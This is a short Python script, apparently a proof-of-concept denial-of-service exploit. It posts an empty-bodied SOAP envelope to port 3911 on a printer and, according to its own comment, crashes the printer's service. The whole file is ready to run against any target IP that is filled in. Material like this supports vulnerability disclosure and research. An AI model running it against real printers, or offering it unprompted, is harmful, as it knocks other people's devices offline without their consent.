import http.client

#printer IP or hostname
server = "0.0.0.0"

#Remote server will not return any data before crashing, so timeout is helpful to prevent http client from hanging indefinitely
conn = http.client.HTTPConnection(server, 3911, timeout=10)
payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\"><SOAP-ENV:Body></SOAP-ENV:Body></SOAP-ENV:Envelope>"
headers = {
  'Accept-Encoding': 'identity',
  'Content-Type': 'text/plain'
}
conn.request("POST", "/", payload, headers)
